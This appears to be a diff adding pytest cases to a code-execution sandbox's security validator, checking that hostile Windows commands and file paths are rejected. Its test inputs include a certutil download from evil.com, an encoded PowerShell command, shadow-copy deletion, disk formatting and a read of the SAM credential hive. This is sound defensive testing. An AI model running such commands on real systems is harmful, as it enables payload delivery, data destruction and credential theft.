@@ -251,3 +251,63 @@ def test_path_traversal_in_virtual_files_blocked():
     valid, err = gov.validate_request(req)
     assert not valid
     assert "Path traversal attempt detected" in err
+
+
+# ==============================================================================
+# WS-03.2: Untrusted Windows Command Paths & Host Escape Prevention
+# ==============================================================================
+
+@pytest.mark.parametrize("win_payload", [
+    "powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
+    "powershell -c whoami",
+    "powershell.exe -ep bypass -File script.ps1",
+    "cmd.exe /c dir C:\\",
+    "cmd /c calc.exe",
+    "pwsh.exe -c Get-ChildItem",
+    "certutil.exe -urlcache -f http://evil.com/mal.exe mal.exe",
+    "mshta.exe javascript:alert(1)",
+    "vssadmin.exe delete shadows /all",
+    "format c: /fs:ntfs",
+    "diskpart.exe /s script.txt",
+    "type C:\\Windows\\System32\\config\\SAM",
+    "reg.exe query HKLM\\Software\\Microsoft",
+])
+def test_windows_host_escape_commands_blocked(win_payload):
+    """Untrusted Windows command paths and host escape binaries are strictly blocked."""
+    gov = SecurityGovernor()
+    req = ExecutionRequest(language="shell", code=win_payload)
+    valid, err = gov.validate_request(req)
+    assert not valid
+    assert "violates security policy" in err or "blocked by sandbox security policy" in err
+
+
+@pytest.mark.parametrize("win_file", [
+    "C:\\Windows\\system32\\evil.dll",
+    "D:/System/rootkit.sys",
+    "\\\\evil-server\\share\\malware.exe",
+    "//192.168.1.5/share/exploit.bat",
+    "test.txt:hidden_stream",
+    "CON",
+    "PRN.txt",
+    "aux.json",
+    "NUL",
+    "COM1",
+    "LPT1.log",
+])
+def test_windows_filesystem_traversal_and_device_names_blocked(win_file):
+    """Windows drive escapes, UNC paths, alternate data streams, and DOS device names are blocked."""
+    gov = SecurityGovernor()
+    req = ExecutionRequest(language="python", code="print(1)", files={win_file: "payload"})
+    valid, err = gov.validate_request(req)
+    assert not valid
+    assert any(
+        token in err
+        for token in [
+            "drive path escape",
+            "UNC network share",
+            "alternate data stream",
+            "Reserved Windows device",
+            "Path traversal",
+        ]
+    )
+
